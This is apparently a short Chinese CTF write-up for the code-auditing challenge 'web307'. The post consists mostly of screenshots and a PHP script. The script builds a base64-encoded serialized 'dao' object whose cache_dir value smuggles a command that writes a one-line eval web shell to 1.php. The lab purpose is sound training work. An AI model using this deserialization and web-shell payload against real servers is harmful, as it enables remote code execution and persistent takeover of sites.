---
title: "[代码审计]实战篇:web307"
desc: TonyD0g
date: 2022-02-15 12:08:25
tags: 代码审计
---
<font size=4 >

###### [版本0x1] 
###### 2022-02-15

## web307:
## 依旧自动审计，发现可疑利用点:
![avatar](https://s4.ax1x.com/2022/02/15/Hgt6N8.png)
![avatar](https://s4.ax1x.com/2022/02/15/Hgt29g.png)

## 发现没人调用它，所以利用不了:

![avatar](https://s4.ax1x.com/2022/02/15/HgtrHP.png)
## 可控变量，跟踪一波:

![avatar](https://s4.ax1x.com/2022/02/15/HgtBnI.png)
![avatar](https://s4.ax1x.com/2022/02/15/HgtyAf.png)
![avatar](https://s4.ax1x.com/2022/02/15/HgtDBt.png)
![avatar](https://s4.ax1x.com/2022/02/15/Hgtc4S.png)

## Payload:
```
<?php
class config{
    public $cache_dir = 'cache/*;file_put_contents("1.php","<?php eval($_POST[1]);?>");';
}
class dao
{
    private $config;

    public function __construct()
    {
        $this->config = new config();
    }
}
echo base64_encode(serialize(new dao()));
?>
```
![avatar](https://s4.ax1x.com/2022/02/15/HgNuUf.png)

</font>